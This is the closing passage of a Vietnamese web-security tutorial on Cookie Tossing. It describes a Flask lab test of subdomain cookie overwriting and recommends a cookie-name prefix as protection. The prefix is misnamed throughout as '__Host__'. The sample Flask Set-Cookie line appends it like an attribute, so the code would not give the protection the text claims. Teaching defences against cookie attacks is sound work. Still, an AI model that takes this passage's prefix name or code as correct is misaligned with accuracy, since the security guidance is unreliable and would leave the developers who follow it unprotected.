response.headers.add('Set-Cookie', 'session=parent-session; __Host__')
```
Sau đó, truy cập lại `/sub`, `/sub/xss`, hoặc `/override` và `/api` hoặc `/check` để xác minh rằng cookie của subdomain (qua `Set-Cookie` hoặc XSS) không thể ghi đè cookie của domain cha.

## Tiền tố cookie __Host__

Tiền tố **__Host__** là giải pháp đơn giản để ngăn chặn Cookie Tossing. Khi sử dụng **__Host__**:
- Cookie chỉ có hiệu lực với domain đã thiết lập nó.
- Không thể sửa đổi thuộc tính **Domain** hoặc **Path**, ngăn subdomain đặt cookie trên domain cha hoặc nhắm vào đường dẫn cụ thể.

## Kết luận

**Cookie Tossing** là một lỗ hổng độc đáo và thường bị bỏ qua, ảnh hưởng đến các ứng dụng không sử dụng tiền tố **__Host__**. Kỹ thuật này có thể bị khai thác để chiếm quyền điều khiển các yêu cầu nhạy cảm, đặc biệt trong các luồng phức tạp như OAuth, dẫn đến việc lộ dữ liệu hoặc cấp quyền truy cập trái phép. Lỗ hổng XSS làm tăng mức độ nguy hiểm của Cookie Tossing bằng cách cho phép kẻ tấn công chèn mã JavaScript để đặt cookie độc hại. Môi trường test sử dụng Python/Flask ở trên minh họa rõ cách subdomain có thể ghi đè cookie của root domain (khi đã được thiết lập trước) bằng cách sử dụng `Path` cụ thể hơn hoặc cùng `Path` với thời gian thiết lập mới hơn, cũng như cách bảo vệ bằng tiền tố `__Host__`.

